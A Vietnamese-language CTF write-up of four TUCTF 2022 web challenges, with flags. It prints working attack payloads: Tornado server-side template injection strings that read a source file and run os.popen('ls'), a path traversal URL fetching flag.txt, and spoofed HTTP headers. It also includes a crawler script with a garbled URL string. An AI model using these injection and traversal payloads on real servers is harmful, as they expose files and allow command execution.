#TUCTF 2022 - Web

##1. Tornado

![Screenshot 2022-12-05 103327](/assets/Screenshot%202022-12-05%20103327.jpg)

#### Challenge description
- Đầu tiên vào trang web có input.

![Screenshot 2022-12-05 103741](https://i.imgur.com/E9oLKD9.jpg)

- Số bị ẩn sẽ là cookie của joe.
![Screenshot 2022-12-05 103851](https://i.imgur.com/dLCqx90.jpg)

- Vì để bài là tornado nên có vẻ như là trang web bị dính ssti thử với payload.
```js
{{7*7}}

=> output: Hello 49! My friend Joe entrusted me with his website template - hope I dont mess anything up, Tornado sure is confusing
```
- Payload 1:
```js
input = {{open('/app/web2.py')}}
```
![Screenshot 2022-12-05 104244](https://i.imgur.com/24n8bko.jpg)
- Payload 2:
```js
{%import os%}{{os.popen("ls").read()}}
=> Ta được đoạn base64 encode, decode thành "go to /parttwooftheproblem" thì thấy cookie của bod và thay vào trang của bod là thành công.
```

```js
Flag: TUCTF{t0rnad0_1snt_v3ry_s3cur3}
```

##2. Hyper Maze
![Screenshot 2022-12-05 104758](https://i.imgur.com/OKlcMkZ.jpg)
- Mở ra là một mê cung khủng khiếp nhưng khi open source thì có một link dẫn tới trang web khác và có vẻ điều này lặp vô hạn...
![Screenshot 2022-12-05 105007](https://i.imgur.com/QCS6dAa.jpg)
- Ý tưởng: <Hơi cùi> tìm kiếm ".html" trong response và get request lại tới trang đó cho tới khi ra flag.
- Payload:
```js
    import requests
hr = 'page_aesthetician100.html'

def check_flag(hr):
    x = requests.get('https://hyper-maze.tuctf.com/pages/%27+hr)
    re = x.text
    re1 = x.text
    if re.find(".html"):
        if re1.find("TUC") != -1:
            flag = re.index("TUC")
            print(re[flag:flag+40])

        result = re.index(".html")
        for i in range(result-25,result+4):
            # print(re[i])
            if ord(re[i]) == 61:
                flag = re[i+2:result+5]

                print(re[i+2:result+5])
                check_flag(flag)
            # print(re[result-20:result+5])

check_flag(hr)
```
![Screenshot 2022-12-05 105328](https://i.imgur.com/MOhr2Yz.jpg)

```js
Flag: TUCTF{y0u_50lv3d_my_hyp3r73x7_m4z3_38157}
```

## 3. Vertical Traversal
![Screenshot 2022-12-05 105917](https://i.imgur.com/VqvPoFy.jpg)
- Trang web bị lỗ hổng Path Traversal.
- Payload
```js
https://vertical-traversal.tuctf.com/get/...%2fflag.txt

Flag: TUCTF{d0nt_us3_r3g3x_f0r_sanitization_416589}
```

## 4. Swapping Heads
![Screenshot 2022-12-05 110158](https://i.imgur.com/S3vtt4W.jpg)
- Đầu tiên vô trang web thì trả về rằng chỉ xem được vào thời gian trưa tới đêm.
![Screenshot 2022-12-05 110711](https://i.imgur.com/NFgTYTn.jpg)
- Do đó thêm header date vào đổi sang tối.
![Screenshot 2022-12-05 110845](https://i.imgur.com/K03x3UP.jpg)
- Trả về là một trình duyệt được kết thúc vào tháng 3 năm 2009 => Trình duyệt internal explorer

![Screenshot 2022-12-05 111049](https://i.imgur.com/WGeI7bH.jpg)
- Trả về hãy đưa email của bạn để gửi. 
![Screenshot 2022-12-05 111313](https://i.imgur.com/vLcueG4.jpg)
```js
Flag: TUCTF{s0_m@ny_h11p_h3@d3r5}
```

